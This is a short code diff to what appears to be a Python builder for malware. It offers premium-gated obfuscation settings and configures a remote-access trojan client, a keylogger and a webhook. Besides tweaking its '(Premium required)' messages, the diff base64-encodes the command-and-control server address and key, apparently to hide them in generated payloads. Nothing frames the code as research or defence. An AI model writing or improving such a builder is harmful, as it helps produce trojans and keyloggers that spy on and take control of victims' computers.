@@ -184,9 +184,8 @@ class Main:
                 break
 
             else:
-                print(color('(Premium required)', 'red'), end='\r')
+                print(color('(Premium required)', 'red'))
                 time.sleep(1)
-                self.flush()
                     
 
             print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
@@ -199,6 +198,10 @@ class Main:
                     continue
 
                 break
+            else:
+                print(color('(Premium required)', 'red'))
+                time.sleep(1)
+
             print(color("Use random byte characters (Y or N): "), end="> ")
 
             while self.premium:
@@ -214,9 +217,8 @@ class Main:
 
                 break
             else:
-                print(color('(Premium required)', 'red'), end='\r')
+                print(color('(Premium required)', 'red'))
                 time.sleep(1)
-                self.flush()
                 self.recursion = 0
                 self.bytes = 0
                 self.base = 0
@@ -231,8 +233,8 @@ class Main:
 
             rat_client = config['CONNECT_TO_SERVER'][0]
             if rat_client:
-                server_addr = config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS']
-                server_key = config['CONNECT_TO_SERVER'][1]['SERVER_KEY']
+                server_addr = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS'].encode()).decode()
+                server_key = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_KEY'].encode()).decode()
                 dynamic_webhook = config['CONNECT_TO_SERVER'][1]['DYNAMIC_WEBHOOK']
                 keylogger = config['KEYLOGGER']
             else:
